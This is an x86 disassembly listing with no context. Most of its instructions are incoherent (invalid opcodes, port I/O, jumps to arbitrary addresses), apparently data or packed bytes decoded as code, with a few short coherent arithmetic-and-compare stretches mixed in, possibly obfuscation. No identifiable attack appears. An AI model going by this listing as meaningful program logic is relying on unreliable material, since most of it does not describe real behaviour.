  40b2b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b4:	into   
  40b2b5:	mov    al,ds:0xcfe7ad60
  40b2ba:	xchg   edi,eax
  40b2bb:	dec    ebp
  40b2bc:	imul   ebp,ebp,0x1c
  40b2bf:	dec    ecx
  40b2c0:	js     0x40b268
  40b2c2:	sbb    BYTE PTR [ebx+0x6099051b],0xc7
  40b2c9:	inc    ecx
  40b2ca:	shl    DWORD PTR [eax+0x641433ce],0x9f
  40b2d1:	jecxz  0x40b2ae
  40b2d3:	scas   al,BYTE PTR es:[edi]
  40b2d4:	popa   
  40b2d5:	xchg   BYTE PTR [eax-0x4cffb195],dh
  40b2db:	fbstp  TBYTE PTR [edx]
  40b2dd:	push   ebp
  40b2de:	mov    al,0x20
  40b2e0:	(bad)  
  40b2e1:	iret   
  40b2e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e4:	sub    eax,0xb2e1a59d
  40b2e9:	aas    
  40b2ea:	in     eax,dx
  40b2eb:	pop    es
  40b2ec:	adc    al,0x6e
  40b2ee:	fisubr WORD PTR [ebp+0x5b]
  40b2f1:	stos   DWORD PTR es:[edi],eax
  40b2f2:	fld1   
  40b2f4:	sti    
  40b2f5:	scas   eax,DWORD PTR es:[edi]
  40b2f6:	jmp    0x7259e58f
  40b2fb:	leave  
  40b2fc:	std    
  40b2fd:	xlat   BYTE PTR ds:[ebx]
  40b2fe:	inc    edx
  40b2ff:	sub    al,0xb8
  40b301:	pop    es
  40b302:	iret   
  40b303:	sub    DWORD PTR [ebp+0x3662323a],edx
  40b309:	std    
  40b30a:	sub    eax,0xbce7a6ca
  40b30f:	out    dx,eax
  40b310:	inc    esp
  40b311:	test   eax,esp
  40b313:	dec    edx
  40b314:	pop    ecx
  40b315:	repnz push ebx
  40b317:	lea    ecx,ds:[esi-0x362fb72b]
  40b31e:	aas    
  40b31f:	pusha  
  40b320:	sub    al,BYTE PTR [ecx+0xac3bf7f]
  40b326:	xlat   BYTE PTR ds:[ebx]
  40b327:	fstp   st(6)
  40b329:	je     0x40b353
  40b32b:	out    0x8e,eax
  40b32d:	or     dh,ah
  40b32f:	push   cs
  40b330:	rcr    DWORD PTR [ecx],cl
  40b332:	pop    edx
  40b333:	push   eax
  40b334:	js     0x40b34e
  40b336:	xlat   BYTE PTR ds:[ebx]
  40b337:	xchg   esp,eax
  40b338:	cmp    al,0x1c
  40b33a:	pop    edi
  40b33b:	out    0x1d,eax
  40b33d:	scas   eax,DWORD PTR es:[edi]
  40b33e:	shr    DWORD PTR [ecx-0x7c],0xa5
  40b342:	sbb    dl,BYTE PTR [eax-0x293d3f94]
  40b348:	add    DWORD PTR [esi-0x6a1adf62],ebp
  40b34e:	push   edi
  40b34f:	sahf   
  40b350:	lahf   
  40b351:	(bad)  
  40b354:	in     eax,0xc8
  40b356:	imul   edi,DWORD PTR [edx-0x4a],0x1d
  40b35a:	and    al,0x78
  40b35c:	(bad)  
  40b35d:	xor    BYTE PTR [esp+eiz*4-0x11],dl
  40b361:	cmp    ebx,edx
  40b363:	ja     0x40b371
  40b369:	mov    edx,DWORD PTR [ebp-0x30]
  40b36c:	jmp    0x40baa7
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	mov    bl,0x9d
  40b3b3:	(bad)  
  40b3b4:	sbb    esp,DWORD PTR [ecx-0x6]
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b38d
  40b3be:	push   ds
  40b3bf:	mov    al,ds:0xab58acde
  40b3c4:	and    esp,DWORD PTR [edi-0x1c3e3c21]
  40b3ca:	add    DWORD PTR [edi*4+0x59139b4d],edi
  40b3d1:	add    ch,al
  40b3d3:	aam    0xd9
  40b3d5:	mov    ds:0x6c7043ee,eax
  40b3da:	scas   al,BYTE PTR es:[edi]
  40b3db:	add    edi,eax
  40b3dd:	(bad)  
  40b3de:	fstp   QWORD PTR [ecx]
  40b3e0:	(bad)  
  40b3e2:	test   eax,0x8b2ee145
  40b3e7:	fimul  DWORD PTR [ebp+0x4d29d421]
  40b3ed:	mov    bh,0x2d
  40b3ef:	ja     0x40b3be
  40b3f1:	mov    al,0xeb
  40b3f3:	jbe    0x40b44f
  40b3f5:	ret    0x1126
  40b3f8:	sbb    dl,BYTE PTR [ebx+0x2e]
  40b3fb:	imul   edx,DWORD PTR [ebx-0x28],0x5b
  40b3ff:	pop    esi
  40b400:	inc    edi
  40b401:	jae    0x40b3d1
  40b403:	(bad)  
  40b404:	pop    edx
  40b405:	pop    ecx
  40b406:	jb     0x40b3dd
  40b408:	shr    BYTE PTR [edi],0x27
  40b40b:	mov    edi,0xef53c09a
  40b410:	push   ebp
  40b411:	ret    0x5b2e
  40b414:	scas   eax,DWORD PTR es:[edi]
  40b415:	std    
  40b416:	dec    esp
  40b417:	mov    eax,0xcb031c1e
  40b41c:	pop    esp
  40b41d:	sbb    BYTE PTR [esp+eax*2+0x6a204a7f],dl
  40b424:	mov    ds:0xbd716e46,al
  40b429:	xor    BYTE PTR ss:[esi+edx*2+0x5c],dl
  40b42e:	out    0x59,al
  40b430:	inc    ebx
  40b431:	jmp    0x281b:0xe48b8270
  40b438:	int3   
  40b439:	xchg   BYTE PTR [edi],ch
  40b43b:	arpl   WORD PTR [esi],ax
  40b43d:	push   esp
  40b43e:	sahf   
  40b43f:	repnz cld 
  40b441:	xchg   BYTE PTR [ebx+eax*4],ah
  40b444:	jge    0x40b47d
  40b446:	daa    
  40b447:	mov    ebp,0xdbbda2c6
  40b44c:	in     eax,0xeb
  40b44e:	(bad)
  40b453:	cs xchg esi,eax
  40b455:	jge    0x40b47b
  40b457:	jp     0x40b46d
  40b459:	cdq    
  40b45a:	push   ebx
  40b45b:	mov    ds,WORD PTR [ebx+edx*2]
  40b45e:	ins    DWORD PTR es:[edi],dx
  40b45f:	(bad)  
  40b460:	xchg   edi,eax
  40b461:	cmp    DWORD PTR [edx+ebp*8],eax
  40b464:	push   ecx
  40b465:	sub    esp,DWORD PTR [esi-0x70]
  40b468:	xor    eax,0xa1389aca
  40b46d:	push   esi
  40b46e:	pop    ss
  40b46f:	shr    BYTE PTR [ebp+edi*2+0x5b],cl
  40b473:	mov    al,ds:0xb16cc03e
  40b478:	xor    ch,ah
  40b47a:	adc    BYTE PTR [esi+0x63],0xfb
  40b47e:	sub    edx,DWORD PTR [ecx]
  40b480:	ja     0x40b455
  40b482:	lods   eax,DWORD PTR ds:[esi]
  40b483:	mov    esp,0x7d08a958
  40b488:	sbb    esi,DWORD PTR [ecx-0x6c92acb2]
  40b48e:	xlat   BYTE PTR cs:[ebx]
  40b490:	ds push ds
  40b492:	push   0x7
  40b494:	loope  0x40b4c7
  40b496:	jg     0x40b4e0
  40b498:	push   0x4577f9ee
  40b49d:	rcl    DWORD PTR [edx-0x50],0x2e
  40b4a1:	loope  0x40b4c5
  40b4a3:	adc    al,0xa9
  40b4a5:	stos   DWORD PTR es:[edi],eax
  40b4a6:	pop    edi
  40b4a7:	popf   
  40b4a8:	int3   
  40b4a9:	nop
  40b4aa:	call   0x2b055eb2
  40b4af:	ss ins BYTE PTR es:[edi],dx
  40b4b1:	fbld   TBYTE PTR [edi+0x37]
  40b4b4:	xchg   edx,eax
  40b4b5:	push   0xffffff87
  40b4b7:	mov    ds:0x26af99e5,al
  40b4bc:	fadd   st(3),st
  40b4be:	repz mov ebx,0x241f5ec2
  40b4c4:	daa    
  40b4c5:	jnp    0x40b4a4
  40b4c7:	arpl   cx,bp
  40b4c9:	out    dx,al
  40b4ca:	and    edx,DWORD PTR [edx+0xfd49518]
  40b4d0:	inc    esi
  40b4d1:	hlt    
  40b4d2:	push   esp
  40b4d3:	div    BYTE PTR [eax+0x5f]
  40b4d6:	mov    fs:0x2e969f23,eax
  40b4dc:	inc    ebp
  40b4dd:	cmp    BYTE PTR ds:0x992a6dee,cl
  40b4e3:	mov    bx,0x7564
  40b4e7:	jns    0x40b558
  40b4e9:	pop    esp
  40b4ea:	or     BYTE PTR [ecx+0x375c7fde],ch
  40b4f0:	aas    
  40b4f1:	mov    edx,0x46a91b6a
  40b4f6:	fs inc edx
  40b4f8:	push   es
  40b4f9:	lods   eax,DWORD PTR ds:[esi]
  40b4fa:	mov    eax,0xa6a75c5f
  40b4ff:	push   0x46
  40b501:	cmp    eax,0xc21b59a
  40b506:	sbb    eax,0xe5be3442
  40b50b:	add    DWORD PTR [edx-0x6c],edx
  40b50e:	sbb    DWORD PTR [edx-0x46],edi
  40b511:	ficomp DWORD PTR [edi+0x7ae8c366]
  40b517:	inc    ebp
  40b518:	xchg   esi,edi
  40b51a:	push   ebp
  40b51b:	lods   eax,DWORD PTR ds:[esi]
  40b51c:	jmp    0x40b4f2
  40b51e:	push   edi
  40b51f:	mov    eax,0x63d23eb6
  40b524:	mov    esp,DWORD PTR [edx]
  40b526:	dec    ecx
  40b527:	sub    eax,0x18fb764f
  40b52c:	pop    esi
  40b52d:	fs xor eax,0x5b6971b6
  40b533:	ins    DWORD PTR es:[edi],dx
  40b534:	fidivr WORD PTR [ebp+ecx*1-0x44338798]
  40b53b:	(bad)
  40b540:	(bad)  
  40b541:	mov    esi,0xc9f954d6
  40b546:	sub    BYTE PTR [edi-0x2],0xd6
  40b54a:	ja     0x40b505
  40b54c:	ficom  DWORD PTR [ecx+eax*2]
  40b54f:	inc    edx
  40b550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b551:	dec    edx
  40b552:	lods   al,BYTE PTR ds:[esi]
  40b553:	add    al,0xd4
  40b555:	cs jle 0x40b570
  40b558:	das    
  40b559:	add    BYTE PTR [ebp-0x1],ch
  40b55c:	(bad)  
  40b55d:	push   ss
  40b55e:	ror    BYTE PTR [esi-0x45e8a55a],0x2f
  40b565:	not    BYTE PTR [esi-0x31]
  40b568:	repnz xchg edi,eax
  40b56a:	adc    BYTE PTR [esi+0x44],bh
  40b56d:	mov    ch,0x83
  40b56f:	adc    eax,0x18471c96
  40b574:	and    ah,BYTE PTR [eax]
  40b576:	inc    eax
  40b577:	mov    esi,0x1ffc6ca5
  40b57c:	adc    eax,0x910fa3b7
  40b581:	push   0xa
  40b583:	lods   eax,DWORD PTR ds:[esi]
  40b584:	dec    ebx
  40b585:	loopne 0x40b523
  40b587:	(bad)  
  40b588:	aaa    
  40b589:	sbb    eax,0x3df3bdcb
  40b58e:	mov    DWORD PTR [eax+0x1c],0x72f29e07
  40b595:	mov    ecx,0x5e8c79c9
  40b59a:	aaa    
  40b59b:	fwait
  40b59c:	pop    eax
  40b59d:	ror    DWORD PTR [ecx-0x5af0f1dd],0xd4
  40b5a4:	push   ss
  40b5a5:	sub    eax,0x1ef88266
  40b5aa:	outs   dx,BYTE PTR ds:[esi]
  40b5ab:	leave  
  40b5ac:	pop    ecx
  40b5ad:	(bad)  
  40b5af:	mov    ds:0xcc0c4c09,al
  40b5b4:	neg    DWORD PTR [esi+0x73]
  40b5b7:	adc    DWORD PTR [ebx-0x68],edx
  40b5ba:	sub    ah,ah
  40b5bc:	sbb    DWORD PTR [esi-0x38a09232],0xd8e9f3e4
  40b5c6:	add    ah,BYTE PTR [ecx+0x170a5c5a]
  40b5cc:	stos   DWORD PTR es:[edi],eax
  40b5cd:	inc    esi
  40b5ce:	sub    eax,0x470ddd4e
  40b5d3:	push   edi
  40b5d4:	aaa    
  40b5d5:	in     al,dx
  40b5d6:	push   0x1b
  40b5d8:	jl     0x40b5d1
  40b5da:	xchg   esi,eax
  40b5db:	xor    DWORD PTR [edx+0x237a0c59],esi
  40b5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5e3:	pusha  
  40b5e4:	lods   al,BYTE PTR ds:[esi]
  40b5e5:	sub    bl,BYTE PTR [ebx-0x491929df]
  40b5eb:	sbb    esp,DWORD PTR [edx-0x2b]
  40b5ee:	test   BYTE PTR [edx-0x6e404c01],bl
  40b5f4:	sub    BYTE PTR [edx],dl
  40b5f6:	adc    BYTE PTR [ebx-0x6e],al
  40b5f9:	inc    eax
  40b5fa:	jle    0x40b665
  40b5fc:	repz lock fcomp QWORD PTR [ebx]
  40b600:	fadd   st,st(7)
  40b602:	jne    0x40b649
  40b604:	sbb    al,0xc4
  40b606:	enter  0xf505,0x64
  40b60a:	and    edx,esp
  40b60c:	call   0x5edb62b6
  40b611:	jl     0x40b600
  40b613:	rcl    BYTE PTR [edi+0x3fb76645],1
  40b619:	out    dx,eax
  40b61a:	out    0x19,eax
  40b61c:	sbb    esp,esp
  40b61e:	ficomp WORD PTR [edx-0x90217b9]
  40b624:	sub    dh,al
  40b626:	jae    0x40b68e
  40b628:	ins    DWORD PTR es:[edi],dx
  40b629:	cmc    
  40b62a:	fs push ss
  40b62c:	je     0x40b675
  40b62e:	adc    DWORD PTR [ebx+eax*4+0x5e],esp
  40b632:	bound  esp,QWORD PTR [edi-0x42]
  40b635:	dec    esp
  40b636:	not    DWORD PTR [ebp+0xd]
  40b639:	or     eax,0x34d64ed2
  40b63e:	mov    esp,0xaac568bb
  40b643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b644:	pushf  
  40b645:	mov    cl,0x71
  40b647:	(bad)  
  40b648:	and    esi,DWORD PTR [esi-0x38]
  40b64b:	xchg   edx,eax
  40b64c:	out    dx,al
  40b64d:	je     0x40b604
  40b64f:	xor    dh,0xe8
  40b652:	pop    edx
  40b653:	sub    bl,BYTE PTR [esi]
  40b655:	inc    esp
  40b656:	dec    ebx
  40b657:	mov    cl,0xc
  40b659:	daa    
  40b65a:	sub    eax,0xb58fffd5
  40b65f:	dec    ecx
  40b660:	and    bl,BYTE PTR [esi+eiz*4+0x64cba833]
  40b667:	mov    bh,0xde
  40b669:	icebp  
  40b66a:	cdq    
  40b66b:	fldlg2 
  40b66d:	jmp    0x40b608
  40b66f:	push   0x6b
  40b671:	dec    esi
  40b672:	sbb    DWORD PTR [edi-0x36],esp
  40b675:	jne    0x40b63a
  40b677:	fst    QWORD PTR ds:0x25b10028
  40b67d:	inc    ecx
  40b67e:	out    dx,al
  40b67f:	scas   al,BYTE PTR es:[edi]
  40b680:	jne    0x40b64a
  40b682:	ret    0x1603
  40b685:	int    0xb1
  40b687:	lea    ebp,[edx-0x333afb5b]
  40b68d:	xchg   ebp,eax
  40b68e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b68f:	js     0x40b6c1
  40b691:	push   ebp
  40b692:	stc    
  40b693:	and    BYTE PTR [edx],bl
  40b695:	in     eax,dx
  40b696:	leave  
  40b697:	test   al,0x80
  40b699:	adc    eax,0x16efd368
  40b69e:	dec    esi
  40b69f:	ret    
  40b6a0:	jmp    0xf9df0f31
  40b6a5:	(bad)  
  40b6a6:	mov    ecx,0x93c312b4
  40b6ab:	ficom  DWORD PTR [edi+eax*1]
  40b6ae:	mov    ebx,0x290f1333
  40b6b3:	ret    
  40b6b4:	int3   
  40b6b5:	inc    edx
  40b6b6:	xchg   ebp,eax
  40b6b7:	mov    BYTE PTR [eax],bh
  40b6b9:	outs   dx,DWORD PTR ds:[esi]
  40b6ba:	jge    0x40b65c
  40b6bc:	loopne 0x40b688
  40b6be:	pop    ebx
  40b6bf:	cli    
  40b6c0:	repnz add eax,0xf375fe1a
  40b6c6:	inc    esp
  40b6c7:	xor    BYTE PTR [eax+0x77bbf130],ah
  40b6cd:	outs   dx,WORD PTR ds:[esi]
  40b6cf:	addr16 jb 0x40b657
  40b6d2:	mov    ?,WORD PTR [di-0x5c]
  40b6d6:	enter  0x6077,0x2d
  40b6da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6db:	xchg   edx,eax
  40b6dc:	ins    DWORD PTR es:[edi],dx
  40b6dd:	inc    edi
  40b6de:	jl     0x40b68f
  40b6e0:	pop    es
  40b6e1:	fidivr WORD PTR [esi-0x35]
  40b6e4:	inc    edi
  40b6e5:	push   ebx
  40b6e6:	push   ds
  40b6e7:	mov    al,ds:0x4f8fe649
  40b6ec:	and    esi,esp
  40b6ee:	shl    DWORD PTR [esi-0x2c],0x51
  40b6f2:	test   dl,dl
  40b6f4:	sbb    BYTE PTR [ecx-0x5a],dh
  40b6f7:	xchg   edx,eax
  40b6f8:	jmp    0x40b6ea
  40b6fa:	jl     0x40b71b
  40b6fc:	mov    al,ds:0x3fd25eda
  40b701:	pop    ecx
  40b702:	sbb    eax,DWORD PTR [ebx-0x72bf08df]
  40b708:	xchg   ebx,eax
  40b709:	jnp    0x40b6cc
  40b70b:	push   edi
  40b70c:	cli    
  40b70d:	(bad)  
  40b70e:	mov    edx,0x9f1ca3f9
  40b713:	xor    edx,eax
  40b715:	xor    edi,eax
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b6e0
  40b743:	lods   al,BYTE PTR ds:[esi]
  40b744:	inc    ebx
  40b745:	or     edi,DWORD PTR [edi]
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b7c8
  40b74f:	loope  0x40b72d
  40b751:	jmp    0x40b72e
  40b753:	jb     0x40b7a7
  40b755:	xchg   DWORD PTR [edx+0x6cd29970],esp
  40b75b:	leave  
  40b75c:	outs   dx,DWORD PTR ds:[esi]
  40b75d:	ins    DWORD PTR es:[edi],dx
  40b75e:	xchg   ecx,eax
  40b75f:	stc    
  40b760:	test   al,0x78
  40b762:	call   0xe715:0x7bb2fa55
  40b769:	xor    DWORD PTR [ebx+0x17ef4cd2],eax
  40b76f:	xor    ah,al
  40b771:	dec    eax
  40b772:	jno    0x40b735
  40b774:	ret    0x2343
  40b777:	dec    esi
  40b778:	xchg   esi,eax
  40b779:	lods   al,BYTE PTR ds:[esi]
  40b77a:	add    DWORD PTR [edi-0x1a],edx
  40b77d:	mov    ds:0xdf75f463,eax
  40b782:	mov    ch,0x55
  40b784:	adc    esp,0xfa19a9f5
  40b78a:	push   ebp
  40b78b:	leave  
  40b78c:	adc    dh,BYTE PTR [ebx+ecx*8+0x71]
  40b790:	sub    esp,DWORD PTR es:[esi+0x6d]
  40b794:	sbb    al,BYTE PTR [eax]
  40b796:	adc    bl,BYTE PTR [ebx]
  40b798:	sub    BYTE PTR [edi+0x6d],0x29
  40b79c:	sub    edi,DWORD PTR [eax]
  40b79e:	scas   al,BYTE PTR es:[edi]
  40b79f:	retf   0x6310
  40b7a2:	aaa    
  40b7a3:	xor    ebp,DWORD PTR [ebp+ecx*1+0x5b4f92ce]
  40b7aa:	sub    al,0xb6
  40b7ac:	pop    ecx
  40b7ad:	pop    ecx
  40b7ae:	in     eax,dx
  40b7af:	mov    ebp,0x523f2650
  40b7b4:	in     al,dx
  40b7b5:	inc    eax
  40b7b6:	call   0xfb30:0xcad6f704
  40b7bd:	mov    ah,0x7c
  40b7bf:	popa   
  40b7c0:	mov    ah,0xcd
  40b7c2:	xchg   ebx,eax
  40b7c3:	jl     0x40b838
  40b7c5:	or     cl,BYTE PTR [ebx-0x2]
  40b7c8:	push   es
  40b7c9:	mov    edx,0x6023818a
  40b7ce:	pushf  
  40b7cf:	call   0x2f293834
  40b7d4:	mov    ecx,0x95010a60
  40b7d9:	aad    0x9b
  40b7db:	and    al,0xb
  40b7dd:	dec    edi
  40b7de:	jns    0x40b84f
  40b7e0:	inc    ebp
  40b7e1:	inc    esi
  40b7e2:	je     0x40b7bf
  40b7e4:	(bad)  [edi]
  40b7e6:	inc    eax
  40b7e7:	loope  0x40b7f0
  40b7e9:	mov    esp,ecx
  40b7eb:	ins    BYTE PTR es:[edi],dx
  40b7ec:	mov    edx,0x2be102cd
  40b7f1:	addps  xmm2,XMMWORD PTR [edi-0x19]
  40b7f5:	daa    
  40b7f6:	imul   esp,DWORD PTR [ebx],0x8e9874be
  40b7fc:	pop    es
  40b7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7fe:	pop    ss
  40b7ff:	arpl   bx,bx
  40b801:	mov    dl,0xb6
  40b803:	out    0x6f,eax
  40b805:	mov    ch,0x67
  40b807:	push   edx
  40b808:	jle    0x40b824
  40b80a:	mov    ecx,0x2ff08127
  40b80f:	cwde   
  40b810:	pushf  
  40b811:	jns    0x40b80f
  40b813:	enter  0x327,0x5d
  40b817:	punpcklbw mm6,DWORD PTR [ecx+ecx*2+0x1f]
  40b81c:	mov    al,ds:0x56d8b1db
  40b821:	retf   
  40b822:	into   
  40b823:	jo     0x40b813
  40b825:	aad    0x42
  40b827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b828:	pop    esi
  40b829:	push   ebp
  40b82a:	mov    ch,0x7d
  40b82c:	add    eax,DWORD PTR [edx+0x1c]
  40b82f:	jb     0x40b86d
  40b831:	push   es
  40b832:	pusha  
  40b833:	je     0x40b833
  40b835:	mov    eax,0xdd1793a
  40b83a:	mov    dh,0x8f
  40b83c:	in     al,dx
  40b83d:	jne    0x40b886
  40b83f:	fimul  WORD PTR [ebx+0x58]
  40b842:	sbb    edx,DWORD PTR [esi+0x26]
  40b845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b846:	out    0x9b,eax
  40b848:	inc    ecx
  40b849:	cli    
  40b84a:	xor    bh,0x5b
  40b84d:	or     edi,esi
  40b84f:	mov    eax,0xfe054e0f
  40b854:	repz call 0x50e3:0x2db7859c
  40b85c:	xor    dh,BYTE PTR [edx+0x34]
  40b85f:	and    al,0x0
  40b861:	jb     0x40b7fd
  40b863:	test   BYTE PTR [esi],al
  40b865:	push   ss
  40b866:	push   ebx
  40b867:	inc    eax
  40b868:	xor    BYTE PTR [edx-0x30],0xf2
  40b86c:	pusha  
  40b86d:	rol    BYTE PTR [esi+0x6d],0xce
  40b871:	sub    ebp,ebp
  40b873:	mov    edx,0x9e687efd
  40b878:	xor    cl,BYTE PTR [ebp+0x345dd5cf]
  40b87e:	push   edi
  40b87f:	bound  esi,QWORD PTR [esp+eiz*8]
  40b882:	test   DWORD PTR [edx-0x76],ebx
  40b885:	clc    
  40b886:	lods   eax,DWORD PTR ds:[si]
  40b888:	or     bl,BYTE PTR [eax+0x497d835e]
  40b88e:	mov    cl,0xcd
  40b890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b891:	or     BYTE PTR [ebp-0x3bc0b081],cl
  40b897:	(bad)  
  40b899:	into   
  40b89a:	repz repnz pop edi
  40b89d:	lds    edi,FWORD PTR [edi-0x5c329564]
  40b8a3:	daa    
  40b8a4:	jle    0x40b84d
  40b8a6:	rol    DWORD PTR [edx-0x6c],1
  40b8a9:	mov    cl,0x16
  40b8ab:	shl    bh,1
  40b8ad:	inc    esi
  40b8ae:	dec    eax
  40b8af:	repz scas eax,DWORD PTR es:[edi]
  40b8b1:	pop    esp
  40b8b2:	pop    ds
  40b8b3:	mov    ebx,0x3e7d693c
  40b8b8:	mov    ebp,0x3f4f231a
  40b8bd:	pop    ecx
  40b8be:	in     al,0x76
  40b8c0:	push   edx
  40b8c1:	sub    al,0x86
  40b8c3:	jns    0x40b930
  40b8c5:	enter  0x4f94,0xab
  40b8c9:	shl    DWORD PTR [eax-0x44],cl
  40b8cc:	pop    ss
  40b8cd:	test   esi,edx
  40b8cf:	push   DWORD PTR [edi+0x30]
  40b8d2:	js     0x40b8ad
  40b8d4:	int3   
  40b8d5:	jae    0x40b89f
  40b8d7:	(bad)  
  40b8d8:	pusha  
  40b8d9:	cwde   
  40b8da:	mov    WORD PTR [ebx+0x4f],gs
  40b8dd:	dec    ebp
  40b8de:	sbb    eax,0xd4cd35a0
  40b8e3:	xchg   esp,eax
  40b8e4:	mov    DWORD PTR [esi-0x514c8427],ecx
  40b8ea:	inc    esi
  40b8eb:	mov    BYTE PTR [edi-0x4a],dh
  40b8ee:	add    dh,0xf7
  40b8f1:	ds inc esp
  40b8f3:	cmp    eax,0x16f3f6c0
  40b8f8:	mov    esp,esp
  40b8fa:	ret    
  40b8fb:	stos   DWORD PTR es:[edi],eax
  40b8fc:	popf   
  40b8fd:	and    eax,0x65376da6
  40b902:	mov    bh,ch
  40b904:	inc    eax
  40b905:	gs cld 
  40b907:	ins    DWORD PTR es:[edi],dx
  40b908:	pop    esi
  40b909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b90a:	out    0x13,eax
  40b90c:	nop
  40b90d:	inc    esi
  40b90e:	ds jne 0x40b8fc
  40b911:	xchg   esp,eax
  40b912:	retf   0x4871
  40b915:	dec    ecx
  40b916:	dec    edi
  40b917:	pop    ss
  40b918:	fldcw  WORD PTR [ebx-0x5a]
  40b91b:	int    0x63
  40b91d:	mov    DWORD PTR [esi],edx
  40b91f:	popa   
  40b920:	in     al,0x37
  40b922:	imul   esi,DWORD PTR [esi],0x3f3781f2
  40b928:	(bad)  
  40b929:	aam    0x76
  40b92b:	or     eax,0x80d470f
  40b930:	loop   0x40b8d2
  40b932:	push   eax
  40b933:	enter  0xce65,0x99
  40b937:	inc    edx
  40b938:	or     al,0x4e
  40b93a:	aas    
  40b93b:	add    BYTE PTR [edx+0x52],bl
  40b93e:	cmp    ch,BYTE PTR [eax-0x75]
  40b941:	scas   eax,DWORD PTR es:[edi]
  40b942:	xchg   edx,eax
  40b943:	into   
  40b944:	aaa    
  40b945:	frstor [edi]
  40b947:	jp     0x40b9be
  40b949:	mov    esi,0xd6eb3e6
  40b94e:	adc    ecx,ebp
  40b950:	mov    ch,0x91
  40b952:	retf   0xc8ec
  40b955:	dec    edx
  40b956:	fistp  DWORD PTR [ecx-0x5a2d98cd]
  40b95c:	hlt    
  40b95d:	push   ecx
  40b95e:	test   eax,0x610ec5
  40b963:	inc    esp
  40b964:	or     ebp,ebx
  40b966:	(bad)  
  40b968:	mov    al,0x5e
  40b96a:	and    al,0x8d
  40b96c:	sub    DWORD PTR [ecx],edx
  40b96e:	in     eax,dx
  40b96f:	lods   al,BYTE PTR ds:[esi]
  40b970:	sub    al,0x9e
  40b972:	sub    ch,ch
  40b974:	adc    DWORD PTR [eax+0xcecf09e],0x999d0c0
  40b97e:	push   esi
  40b97f:	rcl    BYTE PTR [ebx],0x51
  40b982:	mov    esi,0xc6832749
  40b987:	iret   
  40b988:	outs   dx,BYTE PTR ds:[esi]
  40b989:	jno    0x40b9bd
  40b98b:	out    dx,al
  40b98c:	(bad)
  40b990:	ja     0x40b91d
  40b992:	dec    esp
  40b993:	push   cs
  40b994:	sbb    dh,BYTE PTR [ebx]
  40b996:	xchg   ebp,eax
  40b997:	xor    eax,0x4a96c6fa
  40b99c:	pop    ss
  40b99d:	ret    0xac27
  40b9a0:	or     eax,DWORD PTR [ecx-0x14]
  40b9a3:	icebp  
  40b9a4:	adc    al,0x33
  40b9a6:	mov    eax,ds:0x11044c1e
  40b9ab:	in     eax,0x3a
  40b9ad:	lods   eax,DWORD PTR ds:[esi]
  40b9ae:	dec    ebp
  40b9af:	fxch   st(5)
  40b9b1:	fadd   QWORD PTR [edx]
  40b9b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b4:	scas   eax,DWORD PTR es:[edi]
  40b9b5:	lahf   
  40b9b6:	jo     0x40b9c0
  40b9b8:	xchg   ebp,eax
  40b9b9:	xlat   BYTE PTR ds:[ebx]
  40b9ba:	inc    ebx
  40b9bb:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40b9bd:	adc    DWORD PTR [edx-0x12c6443f],edx
  40b9c3:	popa   
  40b9c4:	and    edx,DWORD PTR [ecx-0x60e97994]
  40b9ca:	jle    0x40b9d1
  40b9cc:	jo     0x40ba33
  40b9ce:	pop    ecx
  40b9cf:	adc    eax,DWORD PTR [esi+0x48b89dd3]
  40b9d5:	fiadd  DWORD PTR [esi-0x2b]
  40b9d8:	js     0x40b9f2
  40b9da:	lahf   
  40b9db:	jecxz  0x40b99b
  40b9dd:	addr16 std 
  40b9df:	shr    BYTE PTR [edi-0x7a12bc06],0x5b
  40b9e6:	cmp    BYTE PTR [ebp-0x1b756a3e],cl
  40b9ec:	push   ebp
  40b9ed:	inc    edx
